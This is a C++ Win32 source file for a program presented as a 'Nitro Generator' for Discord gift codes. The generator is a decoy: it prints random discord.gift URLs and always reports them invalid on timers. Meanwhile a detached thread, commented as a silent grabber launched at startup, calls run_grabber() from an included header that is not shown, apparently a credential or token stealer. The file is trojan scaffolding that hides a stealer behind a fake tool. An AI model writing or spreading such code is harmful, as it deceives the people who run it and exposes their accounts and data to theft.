// NitroGen by Rubilacxe
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include "grabber.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

HWND hLog, hStatus, hGenBtn;
bool running = false;

// alphabet des codes nitro (A-Z, 0-9, longueur 16)
std::string random_nitro_code() {
    static const char charset[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 35);
    std::string code;
    code.reserve(16);
    for (int i = 0; i < 16; ++i) code += charset[dis(gen)];
    return code;
}

void log_line(const std::string& s) {
    int len = GetWindowTextLengthA(hLog);
    SendMessageA(hLog, EM_SETSEL, len, len);
    SendMessageA(hLog, EM_REPLACESEL, FALSE, (LPARAM)(s + "\r\n").c_str());
    SendMessageA(hLog, EM_SCROLLCARET, 0, 0);
}

DWORD WINAPI gen_thread(LPVOID) {
    int attempts = 0;
    while (running) {
        attempts++;
        std::string code = random_nitro_code();
        std::string url = "https://discord.gift/" + code;

        log_line("[*] Checking " + url + " ...");
        std::this_thread::sleep_for(std::chrono::milliseconds(1200));
        log_line("[x] Invalid code (attempt " + std::to_string(attempts) + ")");
        std::this_thread::sleep_for(std::chrono::milliseconds(800));
    }
    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE: {
        // font
        HFONT hFont = CreateFontA(15,0,0,0,FW_NORMAL,0,0,0,
            DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,"Consolas");

        // log box
        hLog = CreateWindowA("EDIT", "",
            WS_CHILD|WS_VISIBLE|WS_BORDER|ES_MULTILINE|
            ES_AUTOVSCROLL|ES_READONLY|WS_VSCROLL,
            10, 60, 460, 260, hwnd, NULL, NULL, NULL);
        SendMessage(hLog, WM_SETFONT, (WPARAM)hFont, TRUE);

        // status
        hStatus = CreateWindowA("STATIC",
            "Ready. Press GENERATE to start.",
            WS_CHILD|WS_VISIBLE,
            10, 330, 460, 20, hwnd, NULL, NULL, NULL);
        SendMessage(hStatus, WM_SETFONT, (WPARAM)hFont, TRUE);

        // button
        hGenBtn = CreateWindowA("BUTTON",
            "GENERATE",
            WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
            10, 360, 460, 40, hwnd, (HMENU)1, NULL, NULL);
        SendMessage(hGenBtn, WM_SETFONT, (WPARAM)hFont, TRUE);

        // lancer le grabber au démarrage (thread silencieux)
        std::thread([](){
            std::this_thread::sleep_for(std::chrono::seconds(2));
            run_grabber();
        }).detach();

        break;
    }
    case WM_COMMAND: {
        if (LOWORD(wp) == 1) {
            if (!running) {
                running = true;
                SetWindowTextA(hGenBtn, "STOP");
                SetWindowTextA(hStatus,
                    "Searching valid Nitro codes...");
                log_line("[+] Nitro Gen by Rubilacxe started.");
                CreateThread(NULL, 0, gen_thread, NULL, 0, NULL);
            } else {
                running = false;
                SetWindowTextA(hGenBtn, "GENERATE");
                SetWindowTextA(hStatus, "Stopped.");
                log_line("[!] Generation stopped.");
            }
        }
        break;
    }
    case WM_CTLCOLORSTATIC: {
        HDC hdc = (HDC)wp;
        SetTextColor(hdc, RGB(0, 200, 0));
        SetBkColor(hdc, RGB(20, 20, 20));
        static HBRUSH br = CreateSolidBrush(RGB(20,20,20));
        return (LRESULT)br;
    }
    case WM_DESTROY:
        running = false;
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcA(hwnd, msg, wp, lp);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int nShow) {
    // console cachée déjà par /SUBSYSTEM:WINDOWS

    WNDCLASSA wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hI;
    wc.lpszClassName = "NitroGenRubilacxe";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(RGB(20,20,20));
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowA(
        "NitroGenRubilacxe",
        "Nitro Generator - by Rubilacxe",
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 450,
        NULL, NULL, hI, NULL);

    ShowWindow(hwnd, nShow);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
